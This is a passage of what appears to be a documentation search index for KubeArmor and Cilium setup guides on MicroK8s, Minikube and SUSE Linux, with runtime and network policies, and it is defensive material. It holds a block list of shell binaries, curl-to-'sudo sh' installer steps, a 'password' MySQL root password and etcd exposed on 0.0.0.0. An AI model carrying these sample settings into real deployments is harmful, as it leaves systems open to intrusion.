:32767 5. Verify the policy violation log karmor log","title":"Step 4: Kubearmor Policy on File Level"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-5-kubearmor-policy-on-directory-level","text":"1. Explore the policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchDirectories : - dir : /boot/ recursive : true action : Audit 2. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml Note: Policy will work based on matched labels. Ex: (app: tomcat) 3. Violating the policy kubectl exec -it nginx-6799fc88d8-qdnfq -- bash 4. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 5. Verify policy violation log karmor log","title":"Step 5: Kubearmor Policy on Directory level"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#for-log-based-alerts","text":"You can visit our Enterprise version","title":"For Log Based Alerts"},{"location":"open-source/microk8s/microk8s/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on MicroK8's by applying policies on kubernetes workloads. Step 1: Setup MicroK8's \u00b6 Clone the Kubearmor Repository: git clone https://github.com/kubearmor/KubeArmor.git cd KubeArmor/contribution/microk8s Run the script to set up MicroK8's Kubernetes: ./install_microk8s.sh kubectl get all -A Step 2: Setup KubeArmor \u00b6 Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor Step 3: Create KubeArmor policy \u00b6 1. Create nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Apply the following policy KubeArmor is an open source software that enables you to protect your cloud workload at run-time. To learn more about KubeArmor vi ksp-block-untrusted-shell-execution.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-block-untrusted-shell-execution namespace : default # Change your namespace spec : tags : [ \"MITRE\" , \"D3fend\" , \"Execution\" , \"Unix Shell\" ] message : \"Bash shells have been accessed\" selector : matchLabels : app : nginx process : severity : 2 # Higher severity for processes matchPaths : - path : /bin/bash - path : /bin/sh - path : /usr/bin/bash - path : /usr/bin/env - path : /usr/bin/shell - path : /bin/ksh - path : /etc/init.d - path : /dev/tty - path : /bin/zsh - path : /bin/tcsh - path : /bin/csh action : Block file : severity : 10 # lowest severity for processes invoked as child process of bash matchPaths : - path : /bin/bash - path : /bin/sh - path : /usr/bin/bash - path : /usr/bin/env - path : /usr/bin/shell - path : /bin/ksh - path : /etc/init.d - path : /dev/tty - path : /bin/zsh - path : /bin/tcsh - path : /bin/csh fromSource : - path : /bin/bash action : Audit 3. Apply the policy kubectl apply -f ksp-block-untrusted-shell-execution.yaml Note: Policy will work based on matched labels Ex:(app: nginx) kubectl get pods 4. Violating the policy kubectl exec -it <Pod Name> -- bash 5. run sh, env commands for policy violation Note: Kubearmor is working, we can't run the commands, which we have blocked in the policy.. Step 4: Getting Alerts/Telemetry from KubeArmor \u00b6 1. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 2. Verifying policy Violation logs karmor log Step 5: Cilium Install \u00b6 Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Above tradition installation method is not working as expected, so installing using Microk8's command. microk8s enable cilium cilium status Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Install the Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum } Step 6: Cilium Policy \u00b6 1. Create a Mysql deployment and Verify it vi mysql.yaml apiVersion : v1 kind : Service metadata : name : accuknox-mysql-haproxy spec : ports : - port : 3306 selector : app : mysql type : ClusterIP --- apiVersion : apps/v1 kind : Deployment metadata : name : accuknox-mysql spec : selector : matchLabels : app : mysql strategy : type : Recreate template : metadata : labels : app : mysql spec : containers : - image : mysql:8.0 name : mysql resources : requests : memory : 100M cpu : 100m # ephemeral-storage: 2G limits : memory : 1500M cpu : 1000m # ephemeral-storage: 2G env : # Use secret in real usage - name : MYSQL_ROOT_PASSWORD value : password ports : - containerPort : 3306 name : mysql volumeMounts : - name : mysql-persistent-storage mountPath : /var/lib/mysql volumes : - name : mysql-persistent-storage persistentVolumeClaim : claimName : mysql-pv-claim --- apiVersion : v1 kind : PersistentVolume metadata : name : mysql-pv-volume labels : type : local spec : storageClassName : standard capacity : storage : 2Gi accessModes : - ReadWriteOnce hostPath : path : \"/mnt/data\" --- apiVersion : v1 kind : PersistentVolumeClaim metadata : name : mysql-pv-claim spec : storageClassName : standard accessModes : - ReadWriteOnce resources : requests : storage : 2Gi kubectl apply -f mysql.yaml kubectl get pods kubectl get pods --show-labels 2. Apply the following policy vi cnp-mitre-t1571-mysql-ingress.yaml apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : cnp-mitre-t1571-mysql-ingress namespace : default #change default namespace to match your namespace spec : description : \"Allow ingress communication only through standard ports of MySQL pods\" endpointSelector : matchLabels : app : mysql # Change label with your own labels ingress : - toPorts : - ports : - port : \"3306\" protocol : TCP - port : \"33060\" protocol : TCP 3. Apply the policy kubectl apply -f cnp-mitre-t1571-mysql-ingress.yaml 4. Violating the policy kubectl get pod kubectl exec -it <mysql_pod>bash 5. Deleteing the policy kubectl delete cnp rule1-ingress","title":"Microk8s"},{"location":"open-source/microk8s/microk8s/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on MicroK8's by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/microk8s/microk8s/#step-1-setup-microk8s","text":"Clone the Kubearmor Repository: git clone https://github.com/kubearmor/KubeArmor.git cd KubeArmor/contribution/microk8s Run the script to set up MicroK8's Kubernetes: ./install_microk8s.sh kubectl get all -A","title":"Step 1: Setup MicroK8's"},{"location":"open-source/microk8s/microk8s/#step-2-setup-kubearmor","text":"Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor","title":"Step 2: Setup KubeArmor"},{"location":"open-source/microk8s/microk8s/#step-3-create-kubearmor-policy","text":"1. Create nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Apply the following policy KubeArmor is an open source software that enables you to protect your cloud workload at run-time. To learn more about KubeArmor vi ksp-block-untrusted-shell-execution.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-block-untrusted-shell-execution namespace : default # Change your namespace spec : tags : [ \"MITRE\" , \"D3fend\" , \"Execution\" , \"Unix Shell\" ] message : \"Bash shells have been accessed\" selector : matchLabels : app : nginx process : severity : 2 # Higher severity for processes matchPaths : - path : /bin/bash - path : /bin/sh - path : /usr/bin/bash - path : /usr/bin/env - path : /usr/bin/shell - path : /bin/ksh - path : /etc/init.d - path : /dev/tty - path : /bin/zsh - path : /bin/tcsh - path : /bin/csh action : Block file : severity : 10 # lowest severity for processes invoked as child process of bash matchPaths : - path : /bin/bash - path : /bin/sh - path : /usr/bin/bash - path : /usr/bin/env - path : /usr/bin/shell - path : /bin/ksh - path : /etc/init.d - path : /dev/tty - path : /bin/zsh - path : /bin/tcsh - path : /bin/csh fromSource : - path : /bin/bash action : Audit 3. Apply the policy kubectl apply -f ksp-block-untrusted-shell-execution.yaml Note: Policy will work based on matched labels Ex:(app: nginx) kubectl get pods 4. Violating the policy kubectl exec -it <Pod Name> -- bash 5. run sh, env commands for policy violation Note: Kubearmor is working, we can't run the commands, which we have blocked in the policy..","title":"Step 3: Create KubeArmor policy"},{"location":"open-source/microk8s/microk8s/#step-4-getting-alertstelemetry-from-kubearmor","text":"1. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 2. Verifying policy Violation logs karmor log","title":"Step 4:  Getting Alerts/Telemetry from KubeArmor"},{"location":"open-source/microk8s/microk8s/#step-5-cilium-install","text":"Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install Above tradition installation method is not working as expected, so installing using Microk8's command. microk8s enable cilium cilium status Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Install the Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum }","title":"Step 5: Cilium Install"},{"location":"open-source/microk8s/microk8s/#step-6-cilium-policy","text":"1. Create a Mysql deployment and Verify it vi mysql.yaml apiVersion : v1 kind : Service metadata : name : accuknox-mysql-haproxy spec : ports : - port : 3306 selector : app : mysql type : ClusterIP --- apiVersion : apps/v1 kind : Deployment metadata : name : accuknox-mysql spec : selector : matchLabels : app : mysql strategy : type : Recreate template : metadata : labels : app : mysql spec : containers : - image : mysql:8.0 name : mysql resources : requests : memory : 100M cpu : 100m # ephemeral-storage: 2G limits : memory : 1500M cpu : 1000m # ephemeral-storage: 2G env : # Use secret in real usage - name : MYSQL_ROOT_PASSWORD value : password ports : - containerPort : 3306 name : mysql volumeMounts : - name : mysql-persistent-storage mountPath : /var/lib/mysql volumes : - name : mysql-persistent-storage persistentVolumeClaim : claimName : mysql-pv-claim --- apiVersion : v1 kind : PersistentVolume metadata : name : mysql-pv-volume labels : type : local spec : storageClassName : standard capacity : storage : 2Gi accessModes : - ReadWriteOnce hostPath : path : \"/mnt/data\" --- apiVersion : v1 kind : PersistentVolumeClaim metadata : name : mysql-pv-claim spec : storageClassName : standard accessModes : - ReadWriteOnce resources : requests : storage : 2Gi kubectl apply -f mysql.yaml kubectl get pods kubectl get pods --show-labels 2. Apply the following policy vi cnp-mitre-t1571-mysql-ingress.yaml apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : cnp-mitre-t1571-mysql-ingress namespace : default #change default namespace to match your namespace spec : description : \"Allow ingress communication only through standard ports of MySQL pods\" endpointSelector : matchLabels : app : mysql # Change label with your own labels ingress : - toPorts : - ports : - port : \"3306\" protocol : TCP - port : \"33060\" protocol : TCP 3. Apply the policy kubectl apply -f cnp-mitre-t1571-mysql-ingress.yaml 4. Violating the policy kubectl get pod kubectl exec -it <mysql_pod>bash 5. Deleteing the policy kubectl delete cnp rule1-ingress","title":"Step 6: Cilium Policy"},{"location":"open-source/minikube/minikube/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Minikube by applying policies on kubernetes workloads. Step 1: Clone the KubeArmor Repository \u00b6 git clone https://github.com/kubearmor/KubeArmor.git Step 2: Install VirtualBox \u00b6 cd KubeArmor/contribution/minikube ./install_virtualbox.sh Note: Once VirtualBox installed, reboot the system. sudo reboot Step 3: Install Minikube \u00b6 cd KubeArmor/contribution/minikube ./install_minikube.sh ./start_minikube.sh Step 4: Karmor Install \u00b6 Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: karmor version kubectl get pods -n kube-system | grep kubearmor Step 5: KubeArmor Policy \u00b6 1. Creating sample ubuntu deployment kubectl apply -f ubuntu.yaml kubectl get pods --show-labels 2. Apply the following policy *use label of the deployment cat ksp-block-sting-rhel-v-230335.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-block-stig-rhel-v-230335 namespace : default # Change your namespace spec : tags : [ \"STIG\" , \"RHEL\" ] message : \"Alert! /home/test.txt access will be Audit\" selector : matchLabels : app : ubuntu # Change your matchLabels file : severity : 5 matchPaths : - path : /home/test.txt action : Block 3. Apply the policy kubectl apply -f ksp-block-sting-rhel-v-230335.yaml 4. Violating the policy kubectl exec -it ubuntu-deployment-746964c6c6-j67jv bash Step 6: Getting Alerts/Telemetry from KubeArmor \u00b6 1. KubeArmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor 32767 :32767 2. Verifying policy Violation logs Karmor log Step 7: Cilium Installation \u00b6 Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium- linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install kubectl get pods -n kube-system | grep cilium cilium status --wait Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Install Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum } Step 8: Getting Alerts/Telemetry from Cilium \u00b6 Enable port-forwarding for Cilium Hubble relay: cilium hubble port-forward & Step 9: Cilium Policy \u00b6 1. Create a tightfighter & deathstart deployment cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Apply the following policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-egress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : tiefighter egress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" kubectl apply -f sample-cilium-ingress-policy.yaml kubectl get CiliumNetworkPolicy 3. Violating the policy kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .106.29.11/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .106.29.11/v1/test 4. Verifying the Cilium Violation logs hubble observe --pod tiefighter --protocol http","title":"Minikube"},{"location":"open-source/minikube/minikube/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Minikube by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/minikube/minikube/#step-1-clone-the-kubearmor-repository","text":"git clone https://github.com/kubearmor/KubeArmor.git","title":"Step 1:  Clone the KubeArmor Repository"},{"location":"open-source/minikube/minikube/#step-2-install-virtualbox","text":"cd KubeArmor/contribution/minikube ./install_virtualbox.sh Note: Once VirtualBox installed, reboot the system. sudo reboot","title":"Step 2: Install VirtualBox"},{"location":"open-source/minikube/minikube/#step-3-install-minikube","text":"cd KubeArmor/contribution/minikube ./install_minikube.sh ./start_minikube.sh","title":"Step 3: Install Minikube"},{"location":"open-source/minikube/minikube/#step-4-karmor-install","text":"Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: karmor version kubectl get pods -n kube-system | grep kubearmor","title":"Step 4: Karmor Install"},{"location":"open-source/minikube/minikube/#step-5-kubearmor-policy","text":"1. Creating sample ubuntu deployment kubectl apply -f ubuntu.yaml kubectl get pods --show-labels 2. Apply the following policy *use label of the deployment cat ksp-block-sting-rhel-v-230335.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-block-stig-rhel-v-230335 namespace : default # Change your namespace spec : tags : [ \"STIG\" , \"RHEL\" ] message : \"Alert! /home/test.txt access will be Audit\" selector : matchLabels : app : ubuntu # Change your matchLabels file : severity : 5 matchPaths : - path : /home/test.txt action : Block 3. Apply the policy kubectl apply -f ksp-block-sting-rhel-v-230335.yaml 4. Violating the policy kubectl exec -it ubuntu-deployment-746964c6c6-j67jv bash","title":"Step 5:  KubeArmor Policy"},{"location":"open-source/minikube/minikube/#step-6-getting-alertstelemetry-from-kubearmor","text":"1. KubeArmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor 32767 :32767 2. Verifying policy Violation logs Karmor log","title":"Step 6:  Getting Alerts/Telemetry from KubeArmor"},{"location":"open-source/minikube/minikube/#step-7-cilium-installation","text":"Install Cilium CLI: curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium- linux-amd64.tar.gz { ,.sha256sum } sha256sum --check cilium-linux-amd64.tar.gz.sha256sum sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin rm cilium-linux-amd64.tar.gz { ,.sha256sum } cilium install kubectl get pods -n kube-system | grep cilium cilium status --wait Cilium Hubble Enable: cilium hubble enable Cilium Hubble Verify: kubectl get pods -n kube-system | grep hubble Install Hubble CLI Client: export HUBBLE_VERSION = $( curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt ) curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/ $HUBBLE_VERSION /hubble-linux-amd64.tar.gz { ,.sha256sum } sha256sum --check hubble-linux-amd64.tar.gz.sha256sum sudo tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin rm hubble-linux-amd64.tar.gz { ,.sha256sum }","title":"Step 7: Cilium Installation"},{"location":"open-source/minikube/minikube/#step-8-getting-alertstelemetry-from-cilium","text":"Enable port-forwarding for Cilium Hubble relay: cilium hubble port-forward &","title":"Step 8: Getting Alerts/Telemetry from Cilium"},{"location":"open-source/minikube/minikube/#step-9-cilium-policy","text":"1. Create a tightfighter & deathstart deployment cat tightfighter-deathstart-app.yaml apiVersion : v1 kind : Service metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : type : ClusterIP ports : - port : 80 selector : org : empire class : deathstar --- apiVersion : apps/v1 kind : Deployment metadata : name : deathstar labels : app.kubernetes.io/name : deathstar spec : replicas : 2 selector : matchLabels : org : empire class : deathstar template : metadata : labels : org : empire class : deathstar app.kubernetes.io/name : deathstar spec : containers : - name : deathstar image : docker.io/cilium/starwars --- apiVersion : v1 kind : Pod metadata : name : tiefighter labels : org : empire class : tiefighter app.kubernetes.io/name : tiefighter spec : containers : - name : spaceship image : docker.io/tgraf/netperf --- apiVersion : v1 kind : Pod metadata : name : xwing labels : app.kubernetes.io/name : xwing org : alliance class : xwing spec : containers : - name : spaceship image : docker.io/tgraf/netperf kubectl apply -f tightfighter-deathstart-app.yaml kubectl get pods --show-labels 2. Apply the following policy cat sample-cilium-ingress-policy.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"rule1-egress\" spec : description : \"L7 policy to restrict access to specific HTTP call\" endpointSelector : matchLabels : class : tiefighter egress : - toPorts : - ports : - port : \"80\" protocol : TCP rules : http : - method : \"POST\" path : \"/v1/request-landing\" kubectl apply -f sample-cilium-ingress-policy.yaml kubectl get CiliumNetworkPolicy 3. Violating the policy kubectl get svc kubectl exec -n default tiefighter -- curl -s -XPOST 10 .106.29.11/v1/request-landing kubectl exec -n default tiefighter -- curl -s -XPOST 10 .106.29.11/v1/test 4. Verifying the Cilium Violation logs hubble observe --pod tiefighter --protocol http","title":"Step 9: Cilium Policy"},{"location":"open-source/suse_les_15/suse_les_15/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on SUSE Linux Enterprise Server 15 with 5.3 Kernel Version by applying policies on kubernetes workloads. Step 1: Install etcd in control plane VM \u00b6 Create etcd user: groupadd --system etcd useradd --home-dir \"/var/lib/etcd\" \\ --system \\ --shell /bin/false \\ -g etcd \\ etcd Create the necessary directories: mkdir -p /etc/etcd chown etcd:etcd /etc/etcd mkdir -p /var/lib/etcd chown etcd:etcd /var/lib/etcd Determine your system architecture: uname -m Download and Install the etcd tarball for x86_64/amd64: ETCD_VER = v3.2.7 rm -rf /tmp/etcd && mkdir -p /tmp/etcd curl -L \\ https://github.com/coreos/etcd/releases/download/ ${ ETCD_VER } /etcd- ${ ETCD_VER } -linux-amd64.tar.gz \\ -o /tmp/etcd- ${ ETCD_VER } -linux-amd64.tar.gz tar xzvf /tmp/etcd- ${ ETCD_VER } -linux-amd64.tar.gz \\ -C /tmp/etcd --strip-components = 1 cp /tmp/etcd/etcd /usr/bin/etcd cp /tmp/etcd/etcdctl /usr/bin/etcdctl Or Download and Install the etcd tarball for arm64: ETCD_VER = v3.2.7 rm -rf /tmp/etcd && mkdir -p /tmp/etcd curl -L \\ https://github.com/coreos/etcd/releases/download/ ${ ETCD_VER } /etcd- ${ ETCD_VER } -linux-arm64.tar.gz \\ -o /tmp/etcd- ${ ETCD_VER } -linux-arm64.tar.gz tar xzvf /tmp/etcd- ${ ETCD_VER } -linux-arm64.tar.gz \\ -C /tmp/etcd --strip-components = 1 cp /tmp/etcd/etcd /usr/bin/etcd cp /tmp/etcd/etcdctl /usr/bin/etcdctl Create and Edit the .yaml file: sudo vi /etc/etcd/etcd.conf.yaml name : controller data-dir : /var/lib/etcd initial-cluster-state : 'new' initial-cluster-token : 'etcd-cluster-01' initial-cluster : controller=http://0.0.0.0:2380 initial-advertise-peer-urls : http://0.0.0.0:2380 advertise-client-urls : http://0.0.0.0:2379 listen-peer-urls : http://0.0.0.0:2380 listen-client-urls : http://0.0.0.0:2379 Create and Edit the .service file: sudo vi /usr/lib/systemd/system/etcd.service [ Unit ] After=network.target Description=etcd - highly-available key value store [Service] # Uncomment this on ARM64. # Environment=\"ETCD_UNSUPPORTED_ARCH=arm64\" LimitNOFILE=65536 Restart=on-failure Type=notify ExecStart=/usr/bin/etcd --config-file /etc/etcd/etcd.conf.yml User=etcd [Install] WantedBy=multi-user.target Reload systemd service files with: systemctl daemon-reload Enable and Start the etcd service: systemctl enable etcd systemctl start etcd systemctl status etcd Step 2: Install KVM-Service in control plane VM \u00b6 Download the Latest RPM Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.rpm zypper install kvmservice_0.1_linux-amd64.rpm systemctl status kvmservice Step 3: Install Karmor in control plane VM \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 4: Onboard VMs using Karmor \u00b6 cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VM: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list Step 5: Generate Installation scripts for configured worker VMs \u00b6 Generate VM installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1 Step 6: Execute the Installation script in VMs \u00b6 Note: Docker needs to Install before running the script. Install pre-requisites: sudo zypper ref sudo zypper in bcc-tools bcc-examples fullkver = $( zypper se -s kernel-default-devel | awk '{split($0,a,\"|\"); print a[4]}' | grep $( uname -r | awk '{gsub(\"-default\", \"\");print}' ) | sed -e 's/^[ \\t]*//' | tail -n 1 ) zypper -n --config /var/opt/carbonblack/response/zypp.conf install -f -y kernel-default-devel = \" $fullkver \" zypper in apparmor-utils zypper in apparmor-profiles systemctl restart apparmor.service vi testvm1.sh Comment the following line on script and save it: #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Note: Upcoming release will fix the above comment section. Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To onboard more worker VM repeat Step 4, Step 5 & Step 6. You can verify by running following command: sudo docker ps Step 7: Install Kubearmor on worker VMs \u00b6 Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.rpm zypper install kubearmor_0.3.1_linux-amd64.rpm Start & Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 8: Apply and Verify Kubearmor system policy \u00b6 cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command to apply the policy: karmor vm policy add khp-example-vmname.yaml Step 9: Policy Violation \u00b6 With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Verifying policy Violation logs: karmor log Step 10: Apply and Verify Cilium network policy \u00b6 1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml Step 11: Policy Violation on worker node \u00b6 curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Suse les 15"},{"location":"open-source/suse_les_15/suse_les_15/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on SUSE Linux Enterprise Server 15 with 5.3 Kernel Version by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/suse_les_15/suse_les_15/#step-1-install-etcd-in-control-plane-vm","text":"Create etcd user: groupadd --system etcd useradd --home-dir \"/var/lib/etcd\" \\ --system \\ --shell /bin/false \\ -g etcd \\ etcd Create the necessary directories: mkdir -p /etc/etcd chown etcd:etcd /etc/etcd mkdir -p /var/lib/etcd chown etcd:etcd /var/lib/etcd Determine your system architecture: uname -m Download and Install the etcd tarball for x86_64/amd64: ETCD_VER = v3.2.7 rm -rf /tmp/etcd && mkdir -p /tmp/etcd curl -L \\ https://github.com/coreos/etcd/releases/download/ ${ ETCD_VER } /etcd- ${ ETCD_VER } -linux-amd64.tar.gz \\ -o /tmp/etcd- ${ ETCD_VER } -linux-amd64.tar.gz tar xzvf /tmp/etcd- ${ ETCD_VER } -linux-amd64.tar.gz \\ -C /tmp/etcd --strip-components = 1 cp /tmp/etcd/etcd /usr/bin/etcd cp /tmp/etcd/etcdctl /usr/bin/etcdctl Or Download and Install the etcd tarball for arm64: ETCD_VER = v3.2.7 rm -rf /tmp/etcd && mkdir -p /tmp/etcd curl -L \\ https://github.com/coreos/etcd/releases/download/ ${ ETCD_VER } 